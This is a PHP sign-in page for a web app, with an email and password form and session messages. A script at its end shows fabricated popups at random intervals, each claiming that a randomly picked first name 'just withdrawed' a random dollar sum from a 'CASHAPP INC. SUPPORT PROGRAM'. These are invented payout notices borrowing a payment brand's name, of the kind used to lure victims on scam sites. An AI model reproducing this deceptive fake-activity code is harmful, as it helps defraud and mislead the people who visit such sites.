<?php
session_start();

include('includes/header.php');
include('includes/navbar.php');

if (isset($_SESSION['auth'])) {
    header("Location: users/index");
    exit(0);
}
?>

<!-- Breadcrumb Area Start -->
<section class="breadcrumb-area extra-padding">
    <div class="container">
        <div class="row">
            <div class="col-lg-12">
                <h4 class="title extra-padding" style="opacity:0">Log In</h4>
                <ul class="breadcrumb-list">
                    <li>
                        <a href="index">
                            <i class="fas fa-home"></i> Home
                        </a>
                    </li>
                    <li>
                        <span><i class="fas fa-chevron-right"></i></span>
                    </li>
                    <li>
                        <a href="signin">Login</a>
                    </li>
                </ul>
            </div>
        </div>
    </div>
</section>
<!-- Breadcrumb Area End -->

<!-- Signin Area Start -->
<section class="auth">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-lg-6 col-md-10">
                <div class="sign-form">
                    <div class="heading">
                        <h4 class="title">Hey, welcome back</h4>
                        <style>
                            ::placeholder {
                                color: #ccc !important;
                            }

                            .error {
                                text-align: center;
                                padding: 7px 0;
                                margin-bottom: 5px;
                                background: linear-gradient(to bottom, #f7941d, #f76b1c);
                            }

                            .success {
                                text-align: center;
                                padding: 7px 0;
                                margin-bottom: 5px;
                                background: linear-gradient(to bottom, #f7941d, #f76b1c);
                            }

                            input[type=number]::-webkit-inner-spin-button,
                            input[type=number]::-webkit-outer-spin-button {
                                -webkit-appearance: none;
                                margin: 0;
                            }

                            /* Custom styling for "Register Now" link */
                            .reg-text a {
                                color: #f7951d;
                                font-weight: 600;
                            }

                            .reg-text a:hover,
                            .reg-text a:focus {
                                color: #cc6f0e;
                            }
                        </style>
                        <p class="subtitle">Sign in to continue</p>
                    </div>
                    <form class="form-group mb-0" action="codes/signin" method="POST">
                        <?php  
                        if (isset($_SESSION['success'])) { ?>
                            <div class="success"><?= $_SESSION['success'] ?></div>
                        <?php } unset($_SESSION['success']); ?>

                        <?php  
                        if (isset($_SESSION['error'])) { ?>
                            <div class="error"><?= $_SESSION['error'] ?></div>
                        <?php } unset($_SESSION['error']); ?>

                        <input class="form-control" type="email" name="email" placeholder="Email" style="color:black">
                        <input class="form-control" type="password" name="password" placeholder="Password" style="color:black">

                        <div class="custom-control custom-checkbox d-flex">
                            <span class="ml-auto"><a href="forgot-pass">Forgot Password ?</a></span>
                        </div>

                        <button class="base-btn1" type="submit" name="login">Log In</button>
                        <p class="reg-text text-center mb-0">Don't have an account? <a href="signup">Register Now</a></p>
                    </form>
                </div>
            </div>
        </div>
    </div>
</section>
<!-- Signin Area End -->

<div class="mgm" style="display: none;">
    <div class="txt" style="color:black;"></div>
</div>

<style>
.mgm {
    border-radius: 7px;
    position: fixed;
    z-index: 90;
    bottom: 80px;
    right: 50px;
    background: #fff;
    padding: 10px 27px;
    box-shadow: 0px 5px 13px 0px rgba(0,0,0,.3);
}
.mgm a {
    font-weight: 700;
    display: block;
    color: #f2d516;
}
.mgm a, .mgm a:active {
    transition: all .2s ease;
    color: #f2d516;
}
</style>

<script type="text/javascript">
var listNames = [
    'James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth',
    'David', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Nancy', 'Thomas', 'Karen', 'Charles', 'Lisa',
    'Christopher', 'Sarah', 'Daniel', 'Betty', 'Matthew', 'Margaret', 'Mark', 'Dorothy', 'Steven', 'Helen',
    'Paul', 'Sandra', 'George', 'Ashley', 'Kenneth', 'Donna', 'Andrew', 'Carol', 'Edward', 'Michelle',
    'Joshua', 'Emily', 'Donald', 'Amanda', 'Ronald', 'Melissa', 'Timothy', 'Deborah', 'Jason', 'Laura',
    'Jeffrey', 'Rebecca', 'Ryan', 'Sharon', 'Jacob', 'Cynthia', 'Gary', 'Kathleen', 'Nicholas', 'Amy',
    'Eric', 'Shirley', 'Jonathan', 'Angela', 'Stephen', 'Ruth', 'Larry', 'Brenda', 'Justin', 'Pamela',
    'Scott', 'Nicole', 'Brandon', 'Samantha', 'Benjamin', 'Katherine', 'Samuel', 'Christine', 'Gregory', 'Debra',
    'Brian', 'Rachel', 'Patrick', 'Carolyn', 'Frank', 'Janet', 'Raymond', 'Catherine', 'Dennis', 'Virginia',
    'Jerry', 'Maria', 'Tyler', 'Heather', 'Aaron', 'Diane', 'Jose', 'Julie', 'Adam', 'Joyce'
];

function getRandomAmount() {
    return Math.floor(Math.random() * (10000 - 500 + 1)) + 500;
}

var interval = Math.floor(Math.random() * (15000 - 5000 + 1) + 5000);
var run = setInterval(request, interval);

function request() {
    clearInterval(run);
    interval = Math.floor(Math.random() * (15000 - 5000 + 1) + 5000);
    var name = listNames[Math.floor(Math.random() * listNames.length)];
    var amount = getRandomAmount();
    var msg = '<b>' + name + '</b> just withdrawed <a href="javascript:void(0);" onclick="javascript:void(0);">$'+ amount + '</a> from CASHAPP INC. SUPPORT PROGRAM now';
    $(".mgm .txt").html(msg);
    $(".mgm").stop(true).fadeIn(300);
    window.setTimeout(function() {
        $(".mgm").stop(true).fadeOut(300);
    }, 6000);
    run = setInterval(request, interval);
}
</script>

<?php include('includes/footer.php') ?>
